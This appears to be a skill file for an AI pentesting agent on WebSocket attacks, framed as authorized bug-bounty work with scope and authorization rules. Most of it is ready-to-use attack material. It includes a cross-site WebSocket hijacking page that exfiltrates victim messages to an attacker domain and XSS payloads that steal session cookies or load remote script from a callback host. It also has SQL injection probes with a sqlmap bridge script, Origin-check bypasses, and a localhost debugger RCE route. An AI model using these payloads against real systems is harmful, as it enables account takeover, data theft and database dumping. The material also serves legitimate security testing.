---
name: websocket
description: WebSocket security testing — Cross-Site WebSocket Hijacking (CSWH), XSS via WebSocket message injection into innerHTML, SQLi via WebSocket parameters, and message tampering in Burp. Use when HauntMode flags WebSocket functionality, when the app upgrades HTTP connections to WebSocket (ws:// or wss://), or when testing chat, notification, live-update, or real-time API features.
---

# WebSocket Security — CSWH, XSS, SQLi, Message Tampering

This skill covers all WebSocket attack vectors from the CWEE Modern Web Exploitation Techniques module. Read top-to-bottom on first invocation; jump to the relevant section on repeat runs.

---

## 1. Triggers — when this skill applies

- Any page that upgrades an HTTP connection: `Connection: Upgrade` / `Upgrade: websocket` visible in Burp Proxy history
- Chat, messaging, notification, live-feed, or multiplayer functionality
- JavaScript source containing `new WebSocket(...)`, `socket.send(...)`, `socket.addEventListener('message', ...)`
- `innerHTML +=` or `outerHTML` sink fed by a WebSocket `message` event handler
- Authentication that relies solely on a session cookie (no CSRF token in the upgrade request)
- Burp Proxy → WebSockets history tab showing traffic

---

---

## 3. 30-second triage

1. Open Burp Proxy → **WebSockets history** tab — confirm WS traffic is flowing.
2. Look at the upgrade request: is there a CSRF token or `Origin` validation?
3. Look at the JS source: does a `message` event handler write received data into `innerHTML`?
4. Try sending a message with `<strike>test</strike>` — if it renders as HTML in the UI, XSS applies.
5. Try sending `{"username":"' OR 1=1--"}` style JSON — if the response changes, SQLi applies.
6. Check the `SameSite` attribute of the session cookie — if `None` or absent (defaults to `Lax`), CSWH may be limited but still worth testing depending on the browser context.

**Skip deep dive if:**
- WS connection uses a unique per-connection CSRF token in the upgrade request or first message
- `SameSite=Strict` on the session cookie AND no sub-domain trust issues
- All messages are opaque binary blobs with no user-controlled text

---

## 4. CSWH — Cross-Site WebSocket Hijacking

### 4.1 Conditions required

All three must be true:
1. The WS upgrade endpoint authenticates via **session cookie only** (no CSRF token, no `Origin` check)
2. The session cookie's `SameSite` attribute is `None` (or absent and the browser sends it cross-origin — older behavior)
3. The attacker can lure the victim to a page they control

### 4.2 Confirming the vulnerability

In Burp Repeater, clone the WebSocket connection and change the `Origin` header to an arbitrary external domain (`http://evil.attacker.com`). If the server still establishes the connection and responds to messages, it is vulnerable.

```http
GET /messages HTTP/1.1
Host: target.com
Connection: Upgrade
Upgrade: websocket
Origin: http://evil.attacker.com
Sec-WebSocket-Version: 13
Cookie: session=<victim_session_cookie>
Sec-WebSocket-Key: <key>
```

If the server replies with `101 Switching Protocols`, CSWH is confirmed.

### 4.3 Full CSWH PoC — attacker-hosted page

Host this HTML on your server. When the victim (who is logged in to `target.com`) visits it, their browser sends their session cookie with the WS upgrade, and the payload exfiltrates whatever the server returns.

```html
<!DOCTYPE html>
<html>
<head><title>CSWH PoC</title></head>
<body>
<script>
  // Replace ws://target.com/messages with the actual WS endpoint
  // Replace YOUR_EZXSS_DOMAIN with your exfil destination
  var ws = new WebSocket('ws://target.com/messages');

  ws.onopen = function() {
    // Send whatever message triggers the sensitive data response
    ws.send('!get_messages');
  };

  ws.addEventListener('message', function(ev) {
    fetch('YOUR_EZXSS_DOMAIN/?cswh_data=' + btoa(ev.data), {
      method: 'POST',
      mode: 'no-cors',
      body: ev.data
    });
  });
</script>
<p>Loading...</p>
</body>
</html>
```

**For wss:// (TLS) targets**, change `ws://` to `wss://`. The cookie is still sent cross-origin for WS connections if `SameSite` allows it.

**Tracing which message fired:** append a unique identifier to the exfil URL, e.g. `?cswh_data=chat_msg&payload=` + btoa(ev.data).

### 4.4 SameSite note

Per the notes: "For this exploit to work, the `SameSite` cookie flag must be set to `None`. Since most browsers apply a default value of `Lax` if the `SameSite` cookie attribute is not set, the attack's success would require a deliberately insecure configuration." Test regardless — some apps still use `SameSite=None`, and navigation-triggered top-level requests may bypass `Lax` in some contexts.

---

## 5. XSS via WebSocket message injection

### 5.1 Why `<script>` tags fail here

Per the HTML5 spec: *script elements inserted using innerHTML do not execute when they are inserted.* Use **event handler** payloads instead.

### 5.2 Detection

Send these in order. Watch the receiver's UI (or Burp's WS history response direction):

```
<strike>test</strike>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<img src=x onerror="alert(window.origin)">
```

If any render as HTML (not escaped), XSS is present.

### 5.3 Session cookie exfil via WS channel (no CORS required)

If the victim's page has a global `socket` variable (the WS connection object), you can send the cookie back through the WS channel itself — completely bypassing CORS restrictions:

```html
<!-- Send as WS message to user-facing endpoint -->
<img src=x onerror="socket.send(document.cookie)">
```

Robust version (creates its own connection):
```html
<img src=x onerror="(w=new WebSocket('ws://'+location.host+'/adminws')).onopen=()=>w.send(document.cookie)">
```

Base64 the cookie for safe transport:
```html
<img src=x onerror="(w=new WebSocket('ws://'+location.host+'/adminws')).onopen=()=>w.send(btoa(document.cookie))">
```

### 5.4 Blind XSS via WS (admin panel render)

If messages are rendered in an admin panel or support view you can't directly observe, inject the ezXSS callback:

```html
<img src=x onerror="var s=document.createElement('script');s.src='YOUR_EZXSS_DOMAIN/ws_msg_field';document.body.appendChild(s)">
```

Check the ezXSS dashboard for callbacks. Append `?param=fieldname` to trace which WS endpoint/field fired.

---

## 6. SQLi via WebSocket parameters

### 6.1 Detection

Replace normal parameter values with SQLi detection probes in WS messages. If the response changes (different data, error, or delay), SQLi applies.

```json
{"username": "' OR 1=1--"}
{"username": "\" UNION SELECT \"1"}
{"id": "1 AND SLEEP(5)--"}
{"message": "test' AND '1'='1"}
```

### 6.2 Exploitation via sqlmap middleware

Because sqlmap doesn't natively handle all WS connections, bridge it with a local Flask middleware that proxies HTTP requests to the WS endpoint.

Save as `ws_middleware.py`:

```python
from flask import Flask, request
from websocket import create_connection
import json

app = Flask(__name__)

# Change this to the actual WS endpoint
WS_URL = 'ws://target.com/dbconnector'

@app.route('/')
def index():
    req = {}
    # Change 'username' to whatever the vulnerable parameter name is
    req['username'] = request.args.get('username', '')

    ws = create_connection(WS_URL)
    ws.send(json.dumps(req))
    r = json.loads(ws.recv())
    ws.close()

    if r.get('error'):
        return r['error']
    return str(r.get('messages', r))

app.run(host='127.0.0.1', port=8000)
```

Install dependencies: `pip install flask websocket-client`

Run middleware: `python3 ws_middleware.py`

Then hand off to the researcher to run sqlmap:

```
[RUN THIS]
sqlmap -u 'http://127.0.0.1:8000/?username=testuser' \
  -p username \
  --batch \
  --technique=BEUSTQ \
  --prefix='"' \
  --suffix='-- ' \
  --dbms=mysql --risk=3 --level=5
```

Enumerate databases once injection confirmed:
```
[RUN THIS]
sqlmap -u 'http://127.0.0.1:8000/?username=testuser' \
  -p username --batch --prefix='"' --suffix='-- ' --dbms=mysql --dbs
```

### 6.3 Other vulnerabilities via WS

The same middleware pattern applies for CMDi and LFI via WS — the WS transport doesn't change the underlying vulnerability class; just substitute the relevant payloads.

---

## 7. Message tampering in Burp

Burp intercepts and replays WS messages natively. Key operations:

1. **Intercept in real-time:** Enable Proxy intercept; WS messages (both directions) are intercepted.
2. **Send to Repeater:** Right-click any WS message in WebSockets history → Send to Repeater. Set direction to `To server` or `To client`.
3. **Replay/modify:** Edit the message in Repeater and click Send. You can inject to server and see what the server sends back, or inject a server→client message to see how the client renders it.
4. **Clone connection with modified handshake:** In Repeater, click the pencil icon → Clone → modify headers (e.g., `Origin` header) before connecting. Used for CSWH confirmation.
5. **New connection to different server:** Click "New WebSocket" in the connection selector.

Useful for: testing access control (can unauthenticated WS send privileged messages?), testing message validation (does the server reject unexpected fields?), and confirming whether input is sanitized on receipt.

---

## 8. Bypass techniques

- **CSWH with SameSite=Lax:** Top-level navigation GET requests bypass `Lax`. If the WS upgrade is triggered by a top-level navigation (unlikely but check), it may still work. Otherwise, look for sub-domain takeover chains that put the attacker on `*.target.com`.
- **Origin header filtering bypass:** Some servers check `Origin` starts with `https://target.com` — test `https://target.com.evil.com`.
- **WS over HTTP redirect:** If the server redirects `wss://` to a different endpoint, the browser may send cookies on the redirected connection.
- **SQLi in WS with binary frames:** If messages are binary, decode first, modify, re-encode, and send via Burp Repeater.

---

## 9. False-positive checks

- **CSRF token in first WS message:** If the app sends a one-time token on connection open and the client echoes it back before auth, CSWH is mitigated.
- **`Origin` header validated server-side:** Confirm by actually trying a cross-origin connection (not just by reading headers). Send with `Origin: http://evil.com` and check if the connection is established.
- **WS over `wss://` with mutual TLS:** Certificate pinning or mTLS effectively mitigates CSWH (no cookie theft possible without the cert).
- **Messages are opaque/encrypted at app layer:** XSS and SQLi only apply if you can inject into the message payload. If the app layer applies its own encryption, injection is not possible from the WS layer alone.

---

## 9.5 Localhost WebSocket with no origin check

Desktop/Electron apps and local developer tools often run a WebSocket server on `localhost` (e.g., `ws://127.0.0.1:PORT`) to expose a control or debug interface. These servers frequently perform no `Origin` check because they assume only local processes can connect — they do not account for browser-based access. Any website the victim visits can open a WebSocket connection to `ws://127.0.0.1:PORT` from the browser; the browser attaches no cross-origin restriction to WebSocket upgrades by default.

**Test pattern:**
1. Identify the localhost port (look for it in the app's JS, config files, or by scanning common ports like 9229, 12345, 7777, etc.)
2. From a browser console or attacker-controlled webpage, attempt: `new WebSocket('ws://127.0.0.1:PORT')`
3. If the connection opens, enumerate messages and commands the app accepts

**Impact:** Can range from information disclosure (reading local app state) to full RCE if the local interface exposes command execution (e.g., Node.js `--inspect` debugger on port 9229 accepts arbitrary JS via the Chrome DevTools Protocol — `Runtime.evaluate` runs code in the Node.js process). Other common impacts: arbitrary file read via the local app's API, triggering sensitive actions, or accessing credentials stored in the app.

**Classic example:** Chrome DevTools Protocol on port 9229 — `ws://127.0.0.1:9229/<uuid>`. If an Electron app exposes this without `--remote-debugging-port` restrictions and the user visits a malicious page, the page can achieve RCE inside the Electron process.

---

## 10. Chain candidates

| Chain | Other skill | Impact uplift |
|---|---|---|
| CSWH → session cookie exfil | `xss` (cookie theft pattern) | Account takeover of any user who visits attacker page |
| CSWH → admin message retrieval | `idor` | Access admin-only data without credentials |
| WS XSS → cookie theft | `xss` | Stored XSS variant, same ATO chain |
| WS XSS → blind callback | `xss` (blind section) | Admin panel XSS discovery |
| WS SQLi → DB dump | `sqli` | Full data exfil |
| CSWH → internal API access | `ssrf` (mindset) | Pivot to internal services via victim's session |
| WS endpoint lacks auth → IDOR | `idor` | Unauthenticated access to other users' WS data |

---

## 11. Reporting template

```
POTENTIAL FINDING: Cross-Site WebSocket Hijacking (CSWH) / WebSocket [XSS|SQLi]
Target: <full WS URL e.g. wss://target.com/messages>
Upgrade endpoint: <HTTP GET path for the WS handshake>
Auth mechanism: <session cookie name, SameSite value>
Origin check: <none observed | validated | bypassed via X>

CSWH conditions:
  - Session cookie SameSite: <None | Lax | Strict | unset>
  - Origin header validated: <yes | no>
  - CSRF token in upgrade: <yes | no>

Working PoC:
  <paste the CSWH HTML or XSS payload that confirmed the vuln>

Evidence:
  <screenshot, Burp WS history showing cross-origin connection accepted,
   exfil server log entry, ezXSS callback timestamp>

Impact:
  <e.g. "Any authenticated user who visits attacker-controlled page has their
   private messages exfiltrated" or "Admin cookie stolen via WS XSS enabling ATO">

Chain potential: <CSWH + session hijack, WS XSS + blind admin callback, etc.>

Next step: <develop full ATO PoC | confirm sqlmap dump | submit to in-scope program>
```

---

## 12. Recon tracker vector strings

Only log if the user explicitly authorizes (see CLAUDE.md "CRITICAL RULE"):

- `websocket:cswh:<endpoint>` — CSWH confirmed on named endpoint
- `websocket:xss:<field>` — XSS via WS message injection
- `websocket:sqli:<param>` — SQLi via WS parameter
- `websocket:no-origin-check:<endpoint>` — No Origin validation on upgrade
- `websocket:no:<endpoint>` — Tested, not vulnerable
- `websocket:tamper:<endpoint>` — Message tampering possible, impact TBD

---

## 13. What NOT to do

- **Do not send destructive WS messages** on production (e.g., delete-all commands, admin shutdown messages). Use benign PoC payloads only.
- **Do not flood the WS connection** with automated messages — rate limit awareness applies to WS too. Send targeted probes.
- **Do not claim CSWH without testing cross-origin connection.** Reading the upgrade request is not sufficient — actually attempt the connection with a spoofed Origin in Burp.
- **Do not leave XSS payloads in persistent chat/notification fields** — clean up test messages after confirming the vuln.
- **Do not auto-log to the recon tracker** without explicit user instruction.
- **Do not test out-of-scope sub-domains.** Verify `scope.txt` before probing WS endpoints.
- **Do not run the sqlmap middleware against production** without researcher authorization — it is a tool invocation that needs the researcher to run it per CLAUDE.md ground rules.
